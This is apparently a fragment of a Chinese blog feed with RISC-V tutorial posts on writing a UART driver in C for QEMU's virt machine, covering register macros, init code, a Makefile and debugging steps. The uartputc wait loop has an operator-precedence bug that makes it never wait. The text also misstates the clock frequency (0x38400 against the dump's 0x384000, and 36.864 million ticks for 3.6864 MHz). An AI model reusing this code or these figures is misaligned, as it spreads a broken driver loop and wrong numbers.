码都是用一个字节8位表示的，所以一次传8位肯定是最方便的。</p><table><thead><tr><th>BIT-1</th><th>BIT-0</th><th>Word Length</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>5</td></tr><tr><td>0</td><td>1</td><td>6</td></tr><tr><td>1</td><td>0</td><td>7</td></tr><tr><td>1</td><td>1</td><td>8</td></tr></tbody></table></li><li><p>FCR 寄存器主要控制 FIFO，那么我们到底需不需要 FIFO 呢？参考 <a href="https://www.lammertbies.nl/comm/info/serial-uart">Serial UART information</a> ，我发现如果不使用 FIFO，那么 THR 一次只能存储一个 character，这在 5G 已经开始商用的年代，是不是有点太少了😅，而使用 FIFO 就可以将多个 character 写入或者传输，效率明显提高了，因此我们选择使用 FIFO。</p></li><li><p>那么我们怎么知道数据是否被写入或传输了？LSR 寄存器貌似可以回答这个问题，LSR bit 5 为 0 时，表明 THR 已经满了，而为 1 时，THR为空。LSR bit 0 为 0 时，表示没有数据在 RHR 中，而为 1 时，表示数据已经被放入到 RHR 中，可以读取数据了。</p></li></ul><p>好啦，我们所需要的内容，我已经介绍的差不多了。大家一定发现这里面还有很多很多内容尚待挖掘，但是这里空白太小，我写不下。还是那句话，要想深入研究的话，啃英文技术文档是必不可少的。</p><h2 id="开工！UART-驱动">开工！UART 驱动</h2><p>再次强调，本博客的驱动是使用 C 语言实现的，要想看原博主的 RISC-V 汇编语言实现，那么就点<a href="https://twilco.github.io/riscv-from-scratch/2019/07/28/riscv-from-scratch-4.html">这里</a>。</p><p>首先，创建一个新文件，就叫它 <code>ns16550a.h</code> 吧，这里面主要放一些宏定义和函数声明，有了这些宏，整个程序就更加人性化了，编写更加方便，理解更加轻松。这些宏的值，参考上一节的内容，大家应该不难理解吧。</p><p>虽然宏定义这些年被批判的很惨，主要缘由是无法进入符号表导致 debug 困难，以及一不小心会出现一些与程序员主观不符的表达式，或者改变了某个变量的值而不自知等等。但是考虑到驱动程序小而快的要求，全部定义成全局常量显然不合适，而直接使用立即数肯定会被批判一番，所以，在有些地方，宏定义还是绕不开的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// file ns16550a.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _DF_RISCV_NS16550A_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _DF_RISCV_NS16550A_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_RHR  0  <span class="hljs-comment">// read mode: Receive holding reg   </span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_THR  0  <span class="hljs-comment">// write mode: Transmit Holding Reg</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_IER  1  <span class="hljs-comment">// write mode: interrupt enable reg</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_FCR  2  <span class="hljs-comment">// write mode: FIFO control Reg</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_ISR  2  <span class="hljs-comment">// read mode: Interrupt Status Reg</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_LCR  3  <span class="hljs-comment">// write mode:Line Control Reg</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_MCR  4  <span class="hljs-comment">// write mode:Modem Control Reg</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_LSR  5  <span class="hljs-comment">// read mode: Line Status Reg</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_MSR  6  <span class="hljs-comment">// read mode: Modem Status Reg</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UART_DLL  0  <span class="hljs-comment">// LSB of divisor Latch when enabled</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UART_DLM  1  <span class="hljs-comment">// MSB of divisor Latch when enabled</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UART_BASE_ADDR  0x10000000L</span><br><br><span class="hljs-keyword">volatile</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">Reg</span><span class="hljs-params">(<span class="hljs-type">int</span> reg)</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-title function_">ReadReg</span><span class="hljs-params">(<span class="hljs-type">int</span> reg)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">WriteReg</span><span class="hljs-params">(<span class="hljs-type">int</span> reg, <span class="hljs-type">char</span> c)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">uartinit</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">uartputc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">uartgetc</span><span class="hljs-params">()</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// _DF_RISCV_NS16550A_H</span></span><br></code></pre></td></tr></table></figure><p>大家一定注意到，除了宏定义，我还声明了几个函数。这些函数的实现，全部放在了 <code>ns16550a.c</code> 文件中。</p><p>很明显，函数的实现就是本博客的重头戏了。</p><p>首先，我们实现函数 <code>Reg</code> 它接收一个偏移量，返回一个 <code>char</code> 指针，即该寄存器的数值。从上一节的讨论中，我们已经明白，UART 的寄存器地址就是它的起始地址加上偏移量，这样一来，这个函数应该没什么大问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">Reg</span><span class="hljs-params">(<span class="hljs-type">int</span> reg)</span> &#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">volatile</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(UART_BASE_ADDR+reg);<br>&#125;<br></code></pre></td></tr></table></figure><p>唯一要注意的是，因为寄存器的值非常容易变化，<code>volatile</code> 关键字可以保证程序每次读取寄存器值的内容都是最新的。</p><p>实现了这个函数后，<code>ReadReg</code> 函数和 <code>WriteReg</code> 函数应该不成问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-title function_">ReadReg</span><span class="hljs-params">(<span class="hljs-type">int</span> reg)</span> &#123;<br>    <span class="hljs-keyword">return</span> (*(Reg(reg)));<br>&#125;<br><br><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">WriteReg</span><span class="hljs-params">(<span class="hljs-type">int</span> reg, <span class="hljs-type">char</span> c)</span> &#123;<br>    (*Reg(reg)) = c;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来就是对 UART 设备的初始化，在计算机刚刚开机时，我们无法保证设备内（尤其是寄存器）的值到底是什么的，因此，在使用 UART 设备前，初始化是完全必要的。</p><p>这是我在 <code>ns16550a.c</code> 中编写的初始化代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">uartinit</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// disable interrupt</span><br>    WriteReg(REG_IER, <span class="hljs-number">0x00</span>);<br>    <span class="hljs-comment">// set baud rate</span><br>    WriteReg(REG_LCR, <span class="hljs-number">0x80</span>);<br>    WriteReg(UART_DLL, <span class="hljs-number">0x03</span>);<br>    WriteReg(UART_DLM, <span class="hljs-number">0x00</span>);<br>    <span class="hljs-comment">// set word length to 8-bits</span><br>    WriteReg(REG_LCR, <span class="hljs-number">0x03</span>);<br>    <span class="hljs-comment">// enable FIFOs</span><br>    WriteReg(REG_FCR, <span class="hljs-number">0x07</span>);<br>    <span class="hljs-comment">// enable receiver interrupts</span><br>    WriteReg(REG_IER, <span class="hljs-number">0x01</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果你弄懂了之前我写的<a href="#tip">注意事项</a>，那么这边的代码对你来说就问题不大了。如你所见，<code>WriteReg</code> 函数可以让我们的代码变得更加简洁明了。在 <code>uartinit</code> 函数中，首先要将中断置为失效（我们当然不希望在 UART 初始化的时候就开始产生中断），然后，设置 UART 的传输速率，再设置传输的字长为 8 bit，并打开 FIFO 功能，最后不能忘记，一定要打开中断功能，那么，UART 的初始化就算是完成了！</p><p>好了，将 UART 初始化后，接下来就是把字符传到屏幕上的时刻了，回顾一下我们之前了解到的，UART 中寄存器 LSR 的 bit 5 是用来指示 THR 寄存器是否为空，那么我们可以写个死循环，每时每刻判断是否有字符需要传输。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">uartputc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span> &#123;<br>    <span class="hljs-keyword">while</span>(ReadReg(REG_LSR) &amp; (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>)<br>        ;<br>    WriteReg(REG_THR, c);<br>&#125;<br></code></pre></td></tr></table></figure><p>我承认使用死循环来处理是一个非常愚蠢的做法：浪费了大量的 CPU 计算资源。但这却是最简单的方案。我早已经迫不及待地想看到我们的成果了！</p><p>现在，我们已经接近完工了，只要把之前博客中的 <code>main</code> 函数稍加改造，就可以了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> p = <span class="hljs-string">&#x27;h&#x27;</span>;<br>    uartinit();<br>    uartputc(p);<br>    p++;<br>    uartputc(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>先将 UART 初始化，再让 UART 输出一个 ‘h’ 和 ‘i’ 。</p><hr><p><strong>08-05 Update</strong></p><p>也许我该写一下如何实现 <code>uartgetc</code> 函数？emmm… 只要我们认真学习了 UART 的相关知识，会发现 <code>uartgetc</code> 函数不难写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">uartgetc</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (ReadReg(REG_LSR) &amp; (<span class="hljs-number">0x01</span>)) &#123;<br>        <span class="hljs-keyword">return</span> ReadReg(REG_RHR);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>嗯哼，貌似只要每次调用该函数时，判断 LSR 寄存器来检查 RHR 寄存器是否为空就可以了。但是这样真的可以吗？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// the echo program I wrote in naive way</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a = uartgetc();<br>    uartputc(a);<br>&#125;<br></code></pre></td></tr></table></figure><p>若真的将 <code>main</code> 函数构建并运行，你会发现得到的输出永远是 -1 。你的屏幕上永远不会显示出你在键盘上摁下的字符。为什么？道理很简单，我们的小内核还不足以“感知”键盘的敲击。换句话说，我在交代完小内核所有的任务并让它开始运行后，它飞快地帮我做完了所有事情，不会等待我在键盘上敲击字符，直接认为什么东西都没有输入，以至于我根本来不及反应。因此，我们需要一个完整的中断响应机制，让内核感知到键盘发出信号，才能实现 <code>echo</code>。</p><h2 id="构建工程">构建工程</h2><p>到目前为止，我们的工程算是初具规模，如果大家都按着我的步调来的话，那么工程中的文件应当有</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">work</span><br>|<span class="hljs-comment">--crt0.s</span><br>|<span class="hljs-comment">--main.c</span><br>|<span class="hljs-comment">-- ns16550a.c</span><br>|<span class="hljs-comment">-- ns16550a.h</span><br></code></pre></td></tr></table></figure><p>编译过程与之前<a href="https://dingfen.github.io/risc-v/2020/07/27/riscv-from-scratch-3.html">博客</a>提到的类似，只不过要改几个文件名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">riscv64-unknown-elf-gcc -g -ffreestanding -O0 -Wl,--gc-sections \<br>    -nostartfiles -nostdlib -nodefaultlibs -Wl,-T,riscv64-virt.ld \<br>    crt0.s main.c ns16550a.c<br></code></pre></td></tr></table></figure><p><code>-ffreestanding</code> <a href="https://stackoverflow.com/questions/17692428/what-is-ffreestanding-option-in-gcc#17692510">告诉编译器标准库可能不存在</a>，因此不能做任何假设。在主机环境中运行应用程序时，此选项不是必需的，但是我们没有这样做，因为重要的是告诉编译器该信息。</p><p><code>-Wl</code> 是逗号分隔的标志列表，以传递给链接器 <code>ld</code>。 <code>--gc-sections</code> 代表“垃圾收集 section”，告诉<code>ld</code> 在链接后删除未使用的节。 <code>-nostartfiles</code>，<code>-nostdlib</code> 和 <code>-nodefaultlibs</code> 分别告诉链接器不要链接任何标准系统启动文件（例如默认 <code>crt0</code>），任何标准系统 stdlib 实现或任何标准系统默认可链接库。我们提供了自己的 <code>crt0</code> 和链接描述文件，因此传递这些标志以告知编译器，我们不希望使用这些默认设置中的任何一个。</p><p><code>-T</code> 允许你将你的链接器脚本路径传给链接器，在我们这次实验中就是 <code>riscv64-virt.ld</code> 。最后，加上我们想要编译的文件名就可以了。</p><p>每次打这么长的命令想必令大家感到不愉快，这里还是建议大家写个 <code>Makefile</code> ：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CC=riscv64-unknown-elf-gcc<br>FLAG= -g -ffreestanding -O0 -Wl,--gc-sections -nostartfiles -nostdlib -nodefaultlibs<br>VIRTLD=-Wl,-T,kernel/riscv64-virt.ld<br>TARGET=build/a.out<br><span class="hljs-section">all: work/crt0.s work/ns16550a.c work/main.c</span><br><span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(FLAG)</span> <span class="hljs-variable">$(VIRTLD)</span> <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$(TARGET)</span><br></code></pre></td></tr></table></figure><p>这样的话，大家每次在 shell 中敲入 <code>make</code> 就可以了。紧接着，我们就需要用 <code>qemu</code> 运行一下，看看它会不会与我们打招呼：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">qemu: <span class="hljs-variable">$(TARGET)</span></span><br>qemu-system-riscv64 -machine virt -m 128M -nographic \<br> -kernel build/a.out  \<br>    -bios none<br></code></pre></td></tr></table></figure><p>还是一样，我怕麻烦，将这些命令都放到了 <code>Makefile</code> 中，敲入 <code>make qemu</code> ，就会运行这些命令了！</p><h2 id="运行与调试">运行与调试</h2><p>如果大家成功地做完了上面的步骤，那么，在你的文件夹下，输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">make</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">make qemu</span><br></code></pre></td></tr></table></figure><p>应该会出现下面的情况：</p><p><img src="/img/uarthi.png" alt=""></p><p>看，在最后一行，hi 已经出现了，说明我们的驱动已经可以工作了（虽然粗糙拙劣至极）。</p><p>如果大家想要调试，在 GDB 中看程序一条一条执行的话，那么建议在 <code>Makefile</code> 中写入：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">qemudebug: <span class="hljs-variable">$(TARGET)</span></span><br>qemu-system-riscv64 -machine virt -m 128M -nographic -gdb tcp::1234 \<br> -kernel build/a.out  \<br> -bios none -S<br></code></pre></td></tr></table></figure><p>然后在终端输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make qemudebug<br></code></pre></td></tr></table></figure><p>再打开另一个终端，使用 <code>riscv64-unknown-elf-gdb</code>，具体内容参考<a href="https://dingfen.github.io/risc-v/2020/07/26/riscv-from-scratch-2.html">该博客</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) target remote :1234                                                                             │<br>Remote debugging using :1234<br><br>(gdb) b main<br>Breakpoint 1 at 0x80000xxx: file main.c, line 2.<br></code></pre></td></tr></table></figure><h2 id="接下来">接下来</h2><p>好了，UART 驱动程序我们大致算是完成了！</p><p>到此为止，我们的小内核干了什么？很遗憾，几乎什么也没有，它与我们说了 hi 后就死机了😅，要写出更加复杂的功能，我们还有很长的路要走，接下来，我们要细细研究一下 RISC-V 体系结构的三种模式：<code>machine mode</code>、<code>user mode</code>、<code>supervisor mode</code>，并要合理安排一下内存布局，做一些更棒的事情。</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RISC-V from Scratch 3</title>
    <link href="/2020/07/27/2020-7-27-riscv-from-scratch-3/"/>
    <url>/2020/07/27/2020-7-27-riscv-from-scratch-3/</url>
    
    <content type="html"><![CDATA[<h1>RISC-V from scratch 3: 写 UART 驱动</h1><p>今天为大家继续翻译 <em>RISC-V from scratch</em> 系列博客，接着上一部分内容，我们本此的目标是实现 UART 协议的驱动程序，继续完善 RISC-V 的内核。本文译自 <a href="https://twilco.github.io/riscv-from-scratch/2019/07/08/riscv-from-scratch-3.html">RISC-V from scratch 3: Writing a UART driver in nasm (1 / 3)</a> 。</p><p>由于我发现该系列的原作者貌似没有把这一系列完成就咕咕了，<strong>因此从本文开始，我将加上一些自己实践的内容，以及一些自己的想法，同大家探讨，算是狗尾续貂，弥补遗憾</strong>。</p><h2 id="简介">简介</h2><p>欢迎再次来到 <em>RISC-V from scratch</em> ，先快速回顾一下我们之前做过的内容，我们之前已经探索了很多与 RISC-V 及其生态相关的底层概念（例如编译、链接、原语运行时、汇编等）。具体来说，在上一篇文章中，我们使用 <code>dtc</code> 工具检查了 <code>virt</code>  <code>QEMU</code> 虚拟机中的硬件布局，确定了 <code>RAM</code> 在该计算机中的存放地址，如果你观察仔细的话，会发现 <code>virt</code> 还有很多有趣的地方，其中一个是 <code>UART</code>。</p><p>为了进一步学习 RISC-V 汇编的知识，我们将在接下来的三篇文章中为该 UART 编写驱动程序，深入探索 ABI，函数以及其中的底层堆栈操作等重要概念。</p><p>译注：由于原作者说的三篇文章中的最后一篇还未完成，而译者认为使用 RISC-V 汇编写 UART 驱动程序是吃力不讨好的行为，因此，译者使用 C 语言完成了驱动的编写，以后的内容也会介绍。</p><h2 id="搭建环境"><a href="https://dingfen.github.io/2020/07/24/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">搭建环境</a></h2><p>如果你还未看本系列博客的第一部分，没有安装 <code>riscv-qemu</code> 和 RISC-V 工具链，那么赶紧点击上面标题的链接，跳转到 <a href="https://twilco.github.io/riscv-from-scratch/2019/03/10/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">“QEMU and RISC-V toolchain setup”</a> 。</p><p>之后，再将博主创建的 github 库下载下来，作为我们的工作点。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone git@github.com:twilco/riscv-from-scratch.git<br><span class="hljs-meta prompt_"># </span><span class="language-bash">or `git <span class="hljs-built_in">clone</span> https://github.com/twilco/riscv-from-scratch.git` to <span class="hljs-built_in">clone</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">via HTTPS rather than SSH</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">alternatively, <span class="hljs-keyword">if</span> you are a GitHub user, you can fork this repo.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">https://help.github.com/en/articles/fork-a-repo</span><br>cd riscv-from-scratch/work<br></code></pre></td></tr></table></figure><p>译注：亲测无需下载 github 库也可实现下面的实验。</p><h2 id="什么是-UART">什么是 UART</h2><p>UART 是 “<strong>U</strong>niversal <strong>A</strong>synchronous <strong>R</strong>eceiver-<strong>T</strong>ransmitter” 的缩写，它是用于传输、接收系列数据的硬件设备。串行数据传输是逐位顺序发送数据的过程。 相反，并行数据传输是一次发送多个位的过程。 关于串行并行通信，此图很好地说明了差异：</p><p><img src="https://twilco.github.io/img/riscv-from-scratch/pt-3/Parallel_and_Serial_Transmission.gif" alt="">{:.align-center}</p><p>UART 从不指定数据接收或发送的速率（也称为时钟速率或时钟信号），这是它们异步而不是同步的原因。正因为异步的要求，UART 使用开始和停止位来将数据截断为帧，开始位和停止位会告诉 UART 何时开始和停止读取数据。</p><p>你可能听说过 USARTs (<strong>U</strong>niversal <strong>S</strong>ynchronous/<strong>A</strong>synchronous <strong>R</strong>eceiver-<strong>T</strong>ransmitter) ，该设备既可以同步也可以异步工作，当同步工作时，USART 会放弃使用开始位和停止位，而是在单独的线路上发送时钟信号，实现发送与接受的同步。</p><p>事实上，UART和USART随处可见。 它们内置于几乎所有现代微控制器（包括我们的虚拟机）中。 这些设备工作在交通信号灯、冰箱以及绕地球轨道运行了多年的卫星上。</p><h2 id="硬件布局回顾">硬件布局回顾</h2><p>在我们正式开始写驱动前，我们需要一些额外的信息来解决一些问题。我们如何配置虚拟机的 UART ？ 我们可以在哪个内存地址找到接收和发送缓冲区？</p><p>接下来，我们使用 <code>dtc</code> 工具，回顾一下 <code>uart</code> 的 devicetree 节点的一些信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Install <span class="hljs-string">&#x27;dtc&#x27;</span> <span class="hljs-keyword">if</span> you don<span class="hljs-string">&#x27;t already have it.</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">I use &#x27;</span>brew<span class="hljs-string">&#x27; for MacOS - you may need to do something else.</span></span><br>brew install dtc<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">Use qemu to dump info about the &#x27;</span>virt<span class="hljs-string">&#x27; machine in dtb (device tree blob)</span></span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">format.</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">The data in this file represents hardware components of a given</span></span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">machine / device / board.</span></span><br>qemu-system-riscv64 -machine virt -machine dumpdtb=riscv64-virt.dtb<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">Convert our .dtb into a human-readable .dts (device tree source) file.</span></span><br>dtc -I dtb -O dts -o riscv64-virt.dts riscv64-virt.dtb<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">Search for &#x27;</span>uart<span class="hljs-string">&#x27; and display 2 lines before and 6 lines after each match.</span></span><br>grep uart riscv64-virt.dts -B 2 -A 6<br>        chosen &#123;<br>                bootargs = [00];<br>                stdout-path = &quot;/uart@10000000&quot;;<br>        &#125;;<br>--<br>        &#125;;<br><br>        uart@10000000 &#123;<br>                interrupts = &lt;0x0a&gt;;<br>                interrupt-parent = &lt;0x02&gt;;<br>                clock-frequency = &lt;0x384000&gt;;<br>                reg = &lt;0x00 0x10000000 0x00 0x100&gt;;<br>                compatible = &quot;ns16550a&quot;;<br>        &#125;;<br></code></pre></td></tr></table></figure><p>在 <code>grep</code> 输出的最上面，<code>chosen</code> 节点出现了，该节点内容表明，输出信息会通过 UART 设备打印出来。根据此篇<a href="https://elinux.org/Device_Tree_Usage#chosen_Node">文档</a>，<code>chosen</code> 节点不代表任何物理硬件设备，通常用于在固件和运行在裸机上的程序（比如操作系统）之间的数据交换，我们接下来的操作不需要用到该节点，不必理会。</p><p>接下来才是我们想要的东西—— <code>uart</code> 节点。根据前面的知识，我们很容易就发现 UART 的内存地址位于 <code>0x10000000</code> ，还有 <code>interrupts</code> 和 <code>interrupt-parent</code> 属性，表示 UART 是会产生中断的。</p><p>可能有读者不太熟悉计算机系统，因此我这里简单介绍一下中断 <code>interrupt</code>，中断是硬件或软件向处理器发出的信号，指示事件需要立即处理执行。例如，在以下情况下，UART 可能会产生中断：</p><ul><li>新的数据进入了接收缓存</li><li>数据传送机 (transmitter) 完成了缓存中数据的发送</li><li>UART 遇到了发送错误的情况</li></ul><p>这些中断行为充当 hook ，程序员可编写代码适当地响应这些事件，不过接下来的内容我们不会用到中断，因此先忽略到这些内容吧。</p><p>再来看一下 <code>clock-frequency = &lt;0x38400&gt;</code>  ，参考 <a href="https://buildmedia.readthedocs.org/media/pdf/devicetree-specification/latest/devicetree-specification.pdf">devicetree specification</a> ，<code>clock-frequency</code> 代表了时钟的初始频率，其值为十六进制的 <code>0x38400</code> Hz ，即3.6864 MHz，每秒36.864百万个时钟滴答，这是标准的晶体振荡器频率。</p><p>下一个属性就很熟悉了 <code>reg = &lt;0x00 0x10000000 0x00 0x100&gt;</code> ，决定了 UART 的内存位置，以及它的长度，<a href="https://dingfen.github.io/risc-v/2020/07/26/riscv-from-scratch-2.html">在上一篇文章中</a>，我们知道有两个 32-bit 的值在描述信息。通过给的信息来看，不难得出 UART 的内存位置起始于 <code>0x00 + 0x10000000 = 0x10000000</code> ，且长度为 <code>0x00 + 0x100 = 0x100</code> 字节。</p><p><code>uart</code> 节点的最后一个属性，<code>compatible =“ ns16550a” ;</code>，它告知我们 UART 与哪种编程模型兼容。 操作系统使用此属性来确定其可用于外围设备的设备驱动程序。网上有很多的实现与 NS16550A 兼容的 UART 所需的资料，<a href="https://www.lammertbies.nl/comm/info/serial-uart">这篇</a>是本文所引用的。</p><h2 id="驱动程序的基本框架">驱动程序的基本框架</h2><p>现在，我们创建新文件，取名 <code>ns16550a.s</code> ，在这里我们开始构建驱动程序的基本框架，首先，我们仅仅先实现一个读写字符的函数，不管那些复杂的中断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.global uart_put_char<br>.global uart_get_char<br><br>uart_get_char:<br>    .cfi_startproc<br>    